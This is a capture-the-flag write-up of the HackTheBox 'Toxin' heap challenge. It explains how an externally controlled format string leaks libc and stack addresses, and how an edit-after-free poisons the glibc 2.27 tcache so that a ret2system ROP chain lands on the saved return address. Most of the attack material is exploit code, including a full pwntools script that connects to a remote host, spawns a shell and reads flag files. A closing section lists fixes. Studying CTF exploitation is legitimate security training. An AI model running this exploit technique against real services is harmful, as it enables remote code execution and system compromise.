A menu-driven "chemical toxin lab" heap challenge on glibc 2.27. Two small mistakes — a `free()` that forgets to null its slot pointer, and a `printf` handed a user-controlled format string — combine into a full remote shell. The twist is that the program only lets you `free()` **once** in its entire lifetime, so the classic `__free_hook` route is off the table; instead you poison the tcache freelist to hand `malloc` a pointer to the stack's saved return address and drop a tiny [ret2libc](https://cwe.mitre.org/data/definitions/416.html) chain right on top of it.

## Overview

Toxin is a HackTheBox Pwn challenge (Medium, libc 2.27). Protections are Full RELRO, PIE, and NX — but **no stack canary**, which is the crux of the final step. The binary tracks up to three "toxin" records in a `.bss` pointer array and exposes four actions: Record (`malloc`), Edit, Drink (`free`), and Search. The path to a shell is a [use-after-free](https://cwe.mitre.org/data/definitions/416.html) that gives a tcache write primitive, plus an [externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html) that leaks every base address needed to aim it.

## The technique

There are two bugs, and neither alone is enough:

- **Search is a format-string leak.** The Search option reads a 5-byte term and, on the "not found" path, calls `printf(buf)` with the term as the *format string* — an [externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html). Five bytes is exactly enough for one positional read like `%3$lx`, and you can call Search as many times as you like, so it becomes a general-purpose leak oracle. `%3$lx` yields a libc address, `%9$lx` a PIE address, and `%1$lx` a stack address.

- **Drink + Edit is an edit-after-free.** Drink calls `free(toxins[i])` but never nulls the slot pointer, and Edit still happily `read()`s into `toxins[i]`. On glibc 2.27 the tcache has no forward-pointer integrity check, so editing a freed chunk overwrites its tcache `fd` — a textbook [tcache poisoning](https://cwe.mitre.org/data/definitions/416.html) primitive, no double-free required.

The constraint that shapes the whole exploit: **Drink is globally limited to a single `free()`** via one `toxinfreed` flag. A classic tcache poison needs `free ×1 + malloc ×2`, which fits exactly — but it means you can't re-trigger `free()` to fire a `__free_hook`. So instead of a hook, you point the poisoned `fd` **directly at the stack's saved return address**. With no canary in the way, the second allocation lands on saved-RIP and its `read()` writes your ROP chain.

## Solution

**1. Leak libc and the stack via the format string.** Each Search call leaks one value:

```python
libc.address = leak(3) - 0x110081   # %3$lx sits 0x110081 above libc base
saved_rip    = leak(1) + 0xe        # %1$lx = the search buffer; +0xe = add_toxin's saved-RIP
```

The `+0xe` is a fixed structural offset: the Search buffer and `add_toxin`'s stack frame are both entered from the same menu-loop depth, so the distance from the leaked buffer address to the saved return address is constant across ASLR runs. Measure it once in a debugger (break the vulnerable `printf`, read the argument register; break the target `ret`, read `rsp`; the delta is stable).

**2. Poison the tcache fd onto saved-RIP.** One free, then the edit-after-free rewrites the freed chunk's forward pointer:

```python
SZ = 0x60
add(0, SZ, b'A'*8)      # chunk0
drink(0)                # the one allowed free -> tcache[0x70], fd = NULL
edit(0, p64(saved_rip)) # UAF: overwrite the tcache fd -> saved_rip
add(1, SZ, b'B'*8)      # malloc returns chunk0; tcache head is now saved_rip
```

**3. Hand the poisoned pointer a ROP chain.** The next allocation returns the saved-RIP stack slot, and Record's `read()` writes straight over the saved return address. Because `read` can write up to `size` bytes, a clean `ret2system` chain is more reliable than a constraint-bound one-gadget:

```python
pop_rdi = libc.address + 0x2155f
ret     = libc.address + 0x8aa
binsh   = next(libc.search(b'/bin/sh\x00'))
system  = libc.sym['system']
add(2, SZ, flat(pop_rdi, binsh, ret, system))   # written over saved-RIP
```

When `add_toxin` hits its epilogue `ret`, execution jumps into the chain and `system("/bin/sh")` fires. The full script:

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.binary = elf = ELF('./files/toxin', checksec=False)
libc = ELF('./files/lib/libc.so.6', checksec=False)

host, port = sys.argv[1], int(sys.argv[2])
p = remote(host, port)

def menu(): p.recvuntil(b'> ')
def add(idx, size, data):
    menu(); p.sendline(b'1')
    p.recvuntil(b'length: '); p.sendline(str(size).encode())
    p.recvuntil(b'index: ');  p.sendline(str(idx).encode())
    p.recvuntil(b'formula: '); p.send(data)
def edit(idx, data):
    menu(); p.sendline(b'2')
    p.recvuntil(b'index: '); p.sendline(str(idx).encode())
    p.recvuntil(b'formula: '); p.send(data)
def drink(idx):
    menu(); p.sendline(b'3')
    p.recvuntil(b'index: '); p.sendline(str(idx).encode())
def leak(n):
    menu(); p.sendline(b'4')
    p.recvuntil(b'search term: ')
    p.send(('%%%d$lx' % n).encode())   # exactly 5 bytes, fits read(...,5)
    return int(p.recvline().split(b' not')[0], 16)

libc.address = leak(3) - 0x110081
saved_rip    = leak(1) + 0xe

SZ = 0x60
add(0, SZ, b'A'*8); drink(0); edit(0, p64(saved_rip)); add(1, SZ, b'B'*8)

rop = flat(libc.address + 0x2155f, next(libc.search(b'/bin/sh\x00')),
           libc.address + 0x8aa, libc.sym['system'])
add(2, SZ, rop)

p.sendline(b'cat flag*; cat /flag*; id')
p.interactive()
```

Running it against the live instance drops a shell as `pwn` and prints the flag:

```bash
python3 solve.py <host> <port>
# ...
# HTB{...}
```

## Why it worked

The root cause is two independent lapses that compose. Drink frees a chunk without clearing the dangling pointer, and Edit trusts that pointer — a [use-after-free](https://cwe.mitre.org/data/definitions/416.html) write that, on glibc 2.27's unchecked tcache, is a direct freelist-poisoning primitive. Search then hands attacker input to `printf` as a format string — an [externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html) — which defeats PIE and ASLR by leaking libc and stack addresses. With no stack canary to restore, the poisoned allocation writes a return-oriented chain straight over the saved return address.

## Fix / defense

- **Null the pointer immediately after `free()`** (`toxins[i] = NULL`) so Edit/Drink fail closed — this alone kills the use-after-free.
- **Never pass user input as a format string:** `printf("%s", buf)` instead of `printf(buf)`.
- **Compile with a stack canary** (`-fstack-protector-strong`); it would have blocked the direct saved-RIP overwrite.
- Modern glibc (≥ 2.32) adds tcache forward-pointer mangling (safe-linking) plus a per-thread double-free key, raising the bar on this class of poison considerably.
